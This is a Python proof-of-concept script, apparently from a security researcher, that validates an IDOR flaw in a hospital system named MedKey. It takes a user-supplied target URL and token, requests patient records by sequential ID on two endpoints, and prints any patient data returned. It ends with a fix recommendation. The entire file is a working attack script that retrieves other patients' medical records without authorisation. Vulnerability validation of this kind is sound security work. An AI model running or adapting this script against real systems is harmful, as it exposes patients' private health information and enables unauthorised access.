import requests
import json
import sys

print("""
=================================================================
  MEDKEY HOSPITAL SYSTEM - IDOR VULNERABILITY VALIDATION SCRIPT
=================================================================
github.com/pwnmit
IG: mit.ansal
""")

# User input for Target IP / URL
target_input = input("[?] Enter Target URL/IP (Default: http://127.0.0.1:9090): ").strip()
if not target_input:
    TARGET_URL = "http://127.0.0.1:9090"
else:
    # Adding http:// protocol automatically if the user forgot to type it
    if not target_input.startswith("http://") and not target_input.startswith("https://"):
        TARGET_URL = "http://" + target_input
    else:
        TARGET_URL = target_input

# User input for Authentication Token
AUTH_TOKEN = input("[?] Enter Authenticated Session/Bearer Token (Leave blank if none): ").strip()

# Setting up headers matrix
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Vulnerability-Exploit-PoC)"
}

if AUTH_TOKEN:
    headers["Authorization"] = f"Bearer {AUTH_TOKEN}"

print(f"\n[*] Target Host Locked: {TARGET_URL}")
print("[*] Launching Access Control Validation Layer...")
print("-" * 65)

# Iterating over target resource indexes to test for Horizontal Privilege Escalation
# Testing files against the standalone/local routing endpoints
endpoints_to_test = [
    f"{TARGET_URL}/test_idor.php?id=",
    f"{TARGET_URL}/index.php/medical/patient/get-patient-by-id?id="
]

vulnerable_found = False

for base_endpoint in endpoints_to_test:
    print(f"[*] Fuzzing Base Path: {base_endpoint}")
    
    for patient_id in range(1, 4):
        test_url = f"{base_endpoint}{patient_id}"
        
        try:
            response = requests.get(test_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                # Checking if the response actually contains data and not a default landing page
                try:
                    data = response.json()
                    print(f"[+] SUCCESS: Vulnerability Confirmed (IDOR) for Patient ID: {patient_id}")
                    print(json.dumps(data, indent=2))
                    print("-" * 65)
                    vulnerable_found = True
                except json.JSONDecodeError:
                    # Not a valid JSON, probably a 404 or generic text page
                    continue
                    
            elif response.status_code == 403:
                print(f"[-] SECURE: Server enforced access boundaries for ID: {patient_id} (403 Forbidden)")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Connection Error: Unable to connect to {test_url}")
            break

print("\n[*] Audit Process Completed.")
if vulnerable_found:
    print("[!] Recommendation: Immediately apply server-side session ownership checks in PatientController.php.")
else:
    print("[-] No loose data exfiltration points triggered in this path iteration.")
